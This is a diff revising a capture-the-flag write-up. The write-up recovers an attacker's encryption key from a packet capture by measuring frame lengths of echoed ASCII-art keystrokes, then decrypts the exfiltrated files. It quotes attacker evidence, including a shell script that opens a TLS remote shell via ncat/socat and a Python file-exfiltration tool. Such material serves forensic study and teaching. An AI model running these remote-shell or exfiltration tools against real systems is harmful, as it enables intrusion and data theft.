@@ -5,13 +5,15 @@ Additional analysis of the victim network allowed us to recover some PROTECTIVE 
 Are you able to identify any weaknesses that would allow us to recover the encryption key and figure out what data was exfiltrated?
 
 ## Approach
-- Analyze Evidence Files *cryptshell.sh* and *exfil.py*
-- Analyze *trace.pcapng*
-- Experiment with cryptshell.sh and exfil.py
-- Identify side channel information leak
-- Decrypt transmitted files
+- Static Analysis of Evidence Files *cryptshell.sh* and *exfil.py*
+- Analysis of Evidence File *trace.pcapng*
+- Behavioural Analysis of *cryptshell.sh* and *exfil.py*
+- Hyptothetize Approaches / Identification of a Side Channel Information Leak
+- Exploiting Side Channel Information Leak to retrieve the Encryption Key
+- Decrypt exfiltrated Files
 
-### Code of *cryptshell.sh*
+## Static Analysis of Evidence File *cryptshell.sh*
+### Code
 ```bash
 #!/bin/sh
 
@@ -33,30 +35,25 @@ if [ $# -eq 3 ] && [ $1 = "connect" ] ; then
 fi
 ```
 
-### Analysis of *cryptshell.sh*
-Used with command line argumentis *listen* *ip* and *port*, the script starts a TLS server via *ncat* that yields a remote shell when connected to.
-used with arguments *connect* *ip* *port*, the script acts as a TLS client using *socat* to connect to the server at *ip* *port*.
+### Code Analysis of *cryptshell.sh*
+Used with command line arguments *listen* *ip* and *port*, the script starts a TLS server via *ncat* that yields a remote shell when connected to.
+Executed with arguments *connect* *ip* *port*, the script acts as a TLS client using *socat* to connect to the server at *ip* *port*.
 
 Question: Why is there a commented line that is an alternative *socat* command, missing the options *raw* and *echo=0*?
-This could be a breadcrumb for later.
+Could this be some kind of a breadcrumb for later?
 
-### Code of *exfil.py* (with large cuts)
+## Static Analysis of Evidence File *exfil.py*
+### Code (with large cuts)
 ```python
 [lots of ASCII art ansi sequences and stuff cut out for readability]
 
 class CryptMsg:
     def __init__(self, key, filename, host, port):
-        self.filename = os.path.abspath(filename)
         self.version = 1
-        self.filename = filename
         self.key = key
         self.key_salt = get_random_bytes(16)
         self.derived_key = scrypt(self.key, self.key_salt, 32, 2**14, 8, 1)
         self.cipher = ChaCha20_Poly1305.new(key=self.derived_key)
-        self.host = host
-        self.port = port
-        self.sock = None
-        self.finished = False
 
     def _send_preamble(self):
         self.sock.sendall(b"".join([
@@ -85,11 +82,6 @@ class CryptMsg:
         self.sock.close()
         self.finished = True
 
-    def __repr__(self):
-        return ("CryptMsg<key: {s.key!r}, filename: {s.filename!r}, "
-               "host: {s.host!r}, port: {s.port!r}, finished: "
-               "{s.finished!r}>").format(s=self)
-
 class AsciiChar:
   # stuff
 
@@ -102,44 +94,12 @@ def banner():
 
 def interactive_key():
     print_linewise(colorize("Enter key:"))
-
-    def getch():
-        fd = sys.stdin.fileno()
-        old_settings = termios.tcgetattr(fd)
-        tty.setraw(sys.stdin.fileno())
-
-        ch = sys.stdin.read(1)
-
-        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-
-        return ch
-
-    sequence = AsciiSequence()
-
+    # stuff
     while c := getch():
-        if c == "\r":
-            if len(sequence) >0:
-                break
-            continue
-        elif c == "\x03":
-            raise KeyboardInterrupt            
-        elif c == "\x7f":
-            with suppress(IndexError):
-                sys.stdout.write(sequence.clear())
-                sys.stdout.flush()
-                sequence.pop()
-                sys.stdout.write(sequence.render())
-                sys.stdout.flush()
-            continue
-
-        if sequence.plain_chars:
-            sys.stdout.write(sequence.clear())
-
+        # stuff
         sequence.add_char(c)
-
         sys.stdout.write(sequence.render())
         sys.stdout.flush()
-
     return "".join(sequence.plain_chars)
 
 def main(host, port, files, key=None):
@@ -148,7 +108,6 @@ def main(host, port, files, key=None):
         key = interactive_key()
 
     # stuff
-
     with ThreadPoolExecutor(max_workers=8) as executor:
         for path in files:
             msg = CryptMsg(key, path, host, port)
@@ -159,112 +118,24 @@ if __name__ == "__main__":
     main(args.host, args.port, args.file, args.key)
 ```
 
-### Analysis of *exfil.py*
-- Crypto: ChaCha20 Poly1305
--- https://tools.ietf.org/html/rfc7905
--- https://loup-vaillant.fr/tutorials/chacha20-design
+### Code Analysis of *exfil.py*
+The purpose of this fancy python script seems to be the encrypted exfiltration of local files to a remote server. The cipher used in class **CryptMsg** is ChaCha20_Poly1305 ([RFC 7905](https://tools.ietf.org/html/rfc7905), [ChaCha20 Design](https://loup-vaillant.fr/tutorials/chacha20-design)).
+Further insights on class **CryptMsg**
+- The combination of the ChaCha20 stream cipher and the message authentication code (MAC) Poly1305 itself seems to be a good and secure choice.
+- The key derivation via scrypt seems to look secure on first glance (`self.derived_key = scrypt(self.key, self.key_salt, 32, 2**14, 8, 1)`).
+- File data is transmitted using the **tx()** method, which sends three data blocks: a) a preamble, b) the encrypted file data and c) the message authentication code (digest).
+- The preamble seems to contain interesting unencrypted information like the nonce and the salt used for key derivation.
 
-- Scrypt call looks good. 32 byte keys
-- ASCII art stuff, characters, interactive_key() when option -k is not used
-- Maybe interactive_key() has a fault, FIXME
--- There seems to be a lot of character manipulation, maybe somewhere is an issue that limits the key set
-- This is how *exfil.py* transfers data:
-- Send_Preamble
-- 1 byte: version (PLAIN)
-- 1 byte: nonce length (PLAIN)
-- 12 bytes: nonce (PLAIN)
-- 1 byte: key salt length (PLAIN)
-- 16 bytes: kay salt (PLAIN)
-- 4 byte: filename length (ENCRYPTED)
-- Variable: filename (ENCRYPTED)
-- (ENCRYPTED) file content in 4096 chunks before enc
-- 16 bytes: Digest
-
-### Analysis of *trace.pcapng*
-- 4 tcp streams between 192.168.122.1 and 192.168.122.251
-- 192.168.122.1 is likely attacker box
-- 192.168.122.251 is likely target box
-- stream 0 (.1:56180 -> .251:31337), SYN in packet 1
---> tls 1.3 traffic, likely from cryptshell.sh (ncat --ssl server, socat SSL client)
-tls stream / cryptshell.sh
-Cipher Suite: TLS_AES_256_GCM_SHA384 (0x1302)
-
-- stream 1 (.251:57760 -> .1:1234), SYN in packet 1578 / exfil.py communication
-- preamble in packet 1581
-- version: 1
-- len(nonce): 0x0c (12)
-- nonce: 60 4a e7 0f 2d 46 29 35 d4 c5 41 44
-- len(salt): 0x10 (16)
-- salt: 75 7f fa d8 0a 5f 69 89 14 07 75 1d a4 c7 24 ba
-- len(filename): e8 5e 70 ce (crypted, u32)  <- encrypted value 11 as u32, likely 0b 00 00 00
-- filename: af 11 d8 51 30 d8 2c c0 1a 97 71 (11 bytes)
-
-- file content in packet 1583 (encrypted)
-- 1754 bytes
-
-- cipher.digest in packet 1585 (plain)
-- 9b 43 7e 8b a9 c9 ab 55 cb 18 1c d6 70 c0 64 78 (16 bytes, Poly1305 MAC tag))
-
-- stream 2 (.251:57762 -> .1:1234), SYN in packet 1591 / exfil.py
-- preamble in packet 1594
-- version: 1
-- len(nonce): 0x0c (12)
-- nonce: 0b 5d 76 9d 19 f3 ba 9b 62 17 b9 e0
-- len(salt): 0x10 (16)
-- salt: ad b8 82 d2 85 32 07 0c f0 8c c9 c9 84 c6 b7 52
-- len(filename): b2 69 7e b1 (crypted, u32) <- encrypted value 14 as u32, likely 0e 00 00 00
-- filename: 84 a4 43 1c 3b 49 66 00 72 e6 70 9c dc d9 (14 bytes)
-
-- file content in packet 1596 (encrypted)
-- 2533 bytes
-
-- cipher.digest in packet 1598 (plain)
-- 71 a7 e4 3e 42 8d cd ea a3 c7 b7 cc ec 4f e3 29
-
-- stream 3 (.251:57764 -> .1:1234), SYN in packet 1604 / exfil.py
-- preamble in packet 1607
-- version: 1
-- len(nonce): 0x0c (12)
-- nonce: db ad 67 ae 23 6b 3b 32 86 78 36 7b
-- len(salt): 0x10 (16)
-- salt: e1 54 fd c0 0c 76 bd 1f f9 21 cc 27 b9 fa 3b d5
-- len(filename): c2 9d cf 5b (crypted, u32) <- encrypted value 13 as u32, likely 0d 00 00 00
-- filename: 4d 6d 1a 22 21 67 aa f3 5f 51 35 76 98 (13 bytes)
-
-- file contents in packets 1609+
-- much more data, tcp window full packet 1653/1654
-
-- cipher.digest unknown, should be in last data packet 1660 (FIN, PSH, ACK)
-- maybe last 16 bytes: a9 c8 2d ad ef 66 f8 a7 7a 9f 5b 39 7d d1 ea f0
-
-### Approaches / Ideas
-There are some known strings in the shell stream 0, like call of exfil script with ip port and output from exfil script (transfer complete). But it’s at unknown Offset in ciphertext. Attack on tls 1.3 seems difficult?
-Digest is probably hash of ciphertext (encrypted file content)?
-
-ChaCha20-Poly1305
-https://tools.ietf.org/html/rfc7905
-
-1.3 What do you mean to authenticate the encryption?
-Make sure nobody modifies the ciphertext (encrypted message), it works like verify SHA or MD5 hash of a file. Poly1305 generates a MAC (Message Authentication Code) (128 bits, 16 bytes) and appending it to the ChaCha20 ciphertext (encrypted text). During decryption, the algorithm checks the MAC to assure no one modifies the ciphertext.
-
-1.4 How ChaCha20-Poly1305 works?
-ChaCha20 encryption uses the key and IV (initialization value, nonce) to encrypt the plaintext into a ciphertext of equal length. Poly1305 generates a MAC (Message Authentication Code) and appending it to the ciphertext. In the end, the length of the ciphertext and plaintext is different.
-
--> encrypted file contents end with 16 bytes poly1305 MAC
---> cipher.digest might contain unencrypted poly1305 MAC?
-
-P.S For ChaCha20-Poly1305, we don’t need to define the initial counter value; it begins at 1.
-
-sudo pip3 install PyCryptoDome
-
-
---> Challenge text: "[...] identify any weaknesses that would allow us to recover the encryption key [...]"
-
-Considering the evidence and the fact that the used ciphers seem strong enough, there might be some kind of side channel attack possibility to recover the key from the encrypted data streams.
-
-
+When executing *exfil.py* without any command line arguments, it shows usage information about expected arguments like mandatory *host* *port* *file* and an optional *key*:
 ```
-python3 exfil.py 127.0.0.1 22 trace.pcapng
+$ ./exfil.py 
+usage: exfil.py [-h] [-k KEY] host port file [file ...]
+exfil.py: error: the following arguments are required: host, port, file
+```
+
+Executing *exfil.py* with some fake mandatory options and without the optional key parameter, we can witness lots of fancy ASCII art output, which isn't uncommon for quite a few open source offensive security toolings.
+```
+$ ./exfil.py 127.0.0.1 8888 trace.pcapng
    ____         ___   _    __  __               __   ___                     ___    ____
   / __/ __ __  / _/  (_)  / / / /_  ____ ___ _ / /_ / _ \  ____      _  __  |_  |  |_  /
  / _/   \ \ / / _/  / /  / / / __/ / __// _ `// __// // / / __/     | |/ / / __/  _/_ <
@@ -288,19 +159,54 @@ python3 exfil.py 127.0.0.1 22 trace.pcapng
 Transfer failed: CryptMsg<key: 'dffghj', filename: 'trace.pcapng', host: '127.0.0.1', port: 22, finished: False> ([Errno 111] Connection refused)
 ```
 
--> maybe the ascii art could be used as known plaintext? would have to target the cryptshell.sh tls1.3 stream
+When asked to enter the key, each character is displayed per keypress as some form of *echoing* back. This could be another breadcrumb for identifying a possible weakness or critical information leak.
 
+## Analysis of Evidence File *trace.pcapng*
+The packet capture file *trace.pcapng* contains four TCP streams as summed up by Wireshark / Statistics / Conversations / TCP.
+![Wireshark Conversations TCP](pics/5.png)
 
-### Side Channel Information Leak
-Remind the breadcrumb from analysis of *cryptshell.sh*?
-Maybe there is some kind of information leak based on input echoing?
+Based on the stream metadata and browsing through the stream packet lists, we could likely derive that
+- The TCP SYN packet for TCP stream 0 is found in capture frame number 1 with TCP destination port 31337.
+- TCP stream 0 is doing a TLSv1.3 handshake using cipher suite TLS_AES_256_GCM_SHA384 (0x1302).
+- This leads to the assumption that TCP stream 0 could be traffic originating from a cryptshell.sh connection from client IPv4 address 192.168.122.1 to listener IPv4 address 192.168.122.251 (read: a backdoored server in a target organization's network).
 
-Experiment with cryptshell.sh and sniff traffic for comparisons.
+Given the above evidence files and circumstances, we can assume that the following TCP streams 1 to 3 might be traffic originating from data exfiltration attempts using *exfil.py*. With the knowledge about *exfil.py*'s class **CryptMsg** we can identify the following interesting frames.
+Stream # | SYN frame # | Preamble frame # | File data frame # | MAC frame #
+--- | --- | --- | --- | ---
+1 | 1578 | 1581 | 1583 | 1585
+2 | 1591 | 1594 | 1596 | 1598
+3 | 1604 | 1607 | 1609+ | 1660
+
+Further inspection of the preamble frames yield the unencrypted values for nonce and salt.
+Stream | Preamble frame # | Nonce | Salt | Encrypted filename
+--- | --- | --- | --- | ---
+1 | 1581 | `604ae70f2d462935d4c54144` | `757ffad80a5f69891407751da4c724ba` | `af11d85130d82cc01a9771`
+2 | 1594 | `0b5d769d19f3ba9b6217b9e0` | `adb882d28532070cf08cc9c984c6b752` | `84a4431c3b49660072e6709cdcd9`
+3 | 1607 | `dbad67ae236b3b328678367b` | `e154fdc00c76bd1ff921cc27b9fa3bd5` | `4d6d1a222167aaf35f51357698`
+
+## Hypothetize Approaches
+### General Approaches & Ideas
+To reiterate the used crypto algorithms:
+- TCP stream 0 (cryptshell traffic) is using TLSv1.3 for transport layer encryption using cipher suite TLS_AES_256_GCM_SHA384 (0x1302, see capture frame number 6 offset 0x8e)
+- TCP streams 1-3 (exfil traffic) is using the ChaCha20_Poly1305 stream cipher with message authentication and seems to apply a proper key derivation.
+
+Both crypto algorithms currently do not have publicly known vulnerabilities or weaknesses that could be exploited for decryption.
+TCP stream 0 does likely contain known plaintext in form of ASCII art output of the exfil.py usage. While this might open up a possibility for a known plaintext attack, it didn't appear a viable or easy approach.
+
+TCP streams 1-3 each have a preamble frame in it, which contains known cipher and plaintext (like crypted filename length, which is known). But this didn't seem enough for a proper decryption approach.
+
+With a bit of backtracking, remembering the breadcrumbs and rereading the challenge text part *[...] identify any weaknesses that would allow us to recover the encryption key [...]*, we would assume to find some kind of a side channel information leak.
+
+So one approach could be to further experiment with *exfil.py* usage inside of a *cryptshell.sh* session.
+
+### Identification of a Side Channel Information Leak
+Since we already assume, that we won't retrieve the key or content data directly, we would be aiming for a [side channel attack](https://en.wikipedia.org/wiki/Side-channel_attack). One approach of this kind would be to monitor and analyze capture frame lengths.
+
+For this we could use a setup like depicted below, using terminal windows for a cryptshell listener (right pane), cryptshell client (left upper pane) and a tshark packet sniffer only displaying frame numbers and frame lengths (left lower pane). The displayed state is that of a just opened cryptshell connection.
 
 ![cryptshell_connect](pics/1.png)
 
-The connection itself consists of 15 packets on the wire using TLS cipher: TLS_AES_256_GCM_SHA384 (0x1302).
-Call exfil.py and sniff.
+Executing *exfil.py* with only the mandatory command line arguments will display the below ASCII art that prompts to enter the encryption key.
 ```
 $ ./exfil.py 127.0.0.1 8888 exfil.py                                                                                                                                                                         
    ____         ___   _    __  __               __   ___                     ___    ____
@@ -320,13 +226,13 @@ $ ./exfil.py 127.0.0.1 8888 exfil.py
                                               /___/    
 ```
 
-The sniffed traffic for this ASCII art seems to have the packet sizes 248, 464, 536, 452 and 188.
-These exact packet sizes can be found in the trace.pcapng file at packets #1527, #1529, #1531, #1533 and #1535.
-So it looks like there has been a keyboard interactive input of the ChaCha20 key used for exfil.py.
+The sniffed traffic for this ASCII art will show the frame lengths of 248, 464, 536, 452 and 188.
+This is a great **Bingo!** moment, as these frame length sizes do match for frame numbers #1527, #1529, #1531, #1533 and #1535 in the evidence file trace.pcapng!
 
-![exfil_key_aaaaaa](pics/3.png)
+### Exploitation of Side Channel Information Leak
+This finding leads us to believe, that it might be possible to retrieve the key characters from interactive console input recorded into separate capture frames.
 
-The packets directly following the ASCII art might leak which key was pressed. Each keypress input packet seems to be 89 bytes large with a larger packet returned (due to ASCII art echoing back).
+The capture frames directly following the ASCII art might leak which key was pressed. Each keypress seems to be delivered in a frame of length 89 bytes with a larger frame returned (due to ASCII art echoing back).
 Keypress | Packet # In | Packet Size In | Packet # Echo | Packet Size Echo
 --- | --- | --- | --- | ---
 1 | 1537 | 89 | 1538 | 265
@@ -345,9 +251,10 @@ Keypress | Packet # In | Packet Size In | Packet # Echo | Packet Size Echo
 
 After these packets the packet sizes differ in a way that suggests that the interactive key was 13 characters long.
 
-One approach could be calculating the delta values between each keypress. But a quick test entering `aaa` yields packet sizes 260, 557 (+297) and 839 (+282).
-So basically it's a trial and error from here on trying to find the correct keys yielding the same cumulated packet sizes from trace.pcapng.
+One approach could be calculating the delta values between each keypress. But a quick test entering `aaaaaa` in our simulated setup yields frame lengths of 260, 557 (+297), 839 (+282), 1112 (+273), 1403 (+291) and 1685 (+282) bytes.
+![exfil_key_aaaaaa](pics/3.png)
 
+So basically it's a trial and error from here on trying to find the correct keys yielding the same cumulated packet sizes from trace.pcapng.
 ![key](pics/4_.png)
 
 This side channel information leak through ASCII art packet sizes yielded the key **my_s3cr3t_k3y** that was used to exfiltrate data via *exfil.py*.
@@ -360,6 +267,11 @@ Stream | Preamble Packet # | Nonce | Salt
 1 | 1581 | `604ae70f2d462935d4c54144` | `757ffad80a5f69891407751da4c724ba`
 2 | 1594 | `0b5d769d19f3ba9b6217b9e0` | `adb882d28532070cf08cc9c984c6b752`
 3 | 1607 | `dbad67ae236b3b328678367b` | `e154fdc00c76bd1ff921cc27b9fa3bd5`
+
+Install the required python module in case it isn't yet.
+```
+sudo pip3 install PyCryptoDome
+```
 
 Extract the crypted data from stream 3, save it as network.png.enc and decrypt via
 ```
@@ -391,4 +303,5 @@ Flag: **CS{p4ck3t_siz3_sid3_ch4nn3l}**
 
 ## Conclusion
 Using modern and cryptographically secure algorithms is a great start for securing the confidentiality and integrity of data transmissions.
-But as this challenge shows quite nicely, that is not enough. Fancy ASCII art from tools used in an interactive shell might lead to information leaks through side channels like packet sizes (or timings).
+But as this challenge shows quite nicely, that is not enough. Fancy ASCII art from tools used in an interactive shell might lead to information leaks through side channels like frame lengths (or timings).
+
